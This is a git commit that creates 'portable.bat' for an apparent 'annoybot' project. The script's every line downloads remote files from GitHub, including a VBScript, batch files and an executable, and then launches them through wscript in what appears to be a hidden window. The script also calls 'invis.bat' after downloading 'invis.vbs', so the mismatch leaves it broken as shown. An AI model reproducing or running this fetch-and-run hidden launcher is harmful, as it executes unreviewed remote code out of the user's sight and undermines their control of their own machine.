7f2a48db3588c08d7a6329a8275c39a06e019603
SnowyOwl <49002319+Th3SnowyOwl@users.noreply.github.com>
2022-08-04 21:19:37 -0400

    Create portable.bat

---
+++ annoybot/portable.bat
@@ -0,0 +1,5 @@
+curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/invis.vbs
+curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/oof.bat
+curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/getCmdPID.exe
+curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/launch.bat
+wscript.exe "invis.bat" launch.bat
